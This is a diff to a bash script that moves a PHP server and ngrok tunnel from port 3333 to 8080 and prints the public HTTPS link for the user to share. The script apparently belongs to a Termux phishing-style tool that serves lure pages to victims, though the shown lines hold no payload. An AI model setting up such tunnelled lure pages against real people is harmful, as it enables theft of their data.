@@ -150,16 +150,16 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server(Turn On Hotspot if on termux) \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
-php -S 0.0.0.0:3333 > /dev/null 2>&1 &
+php -S 0.0.0.0:8080 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server(Hotspot must be started) \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
+./ngrok http 8080 > /dev/null 2>&1 &
+sleep 5
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 
 if [[ -z $link ]];then
-printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 3333\e[0m\n"
+printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 8080\e[0m\n"
 exit 1
 fi
 printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
